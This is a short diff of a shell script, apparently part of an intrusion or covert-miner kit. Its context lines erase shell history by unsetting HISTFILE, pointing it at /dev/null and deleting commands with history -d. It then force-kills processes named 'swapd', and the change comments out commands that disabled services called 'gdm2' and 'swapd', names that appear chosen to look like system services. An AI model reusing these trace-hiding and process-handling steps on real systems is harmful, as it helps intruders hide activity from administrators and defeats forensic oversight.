@@ -4,8 +4,8 @@ unset HISTFILE
 unset HISTFILE ;history -d $((HISTCMD-1))
 export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
 
-systemctl disable gdm2 --now
-systemctl disable swapd --now
+#systemctl disable gdm2 --now
+#systemctl disable swapd --now
 
 #killall swapd
 kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
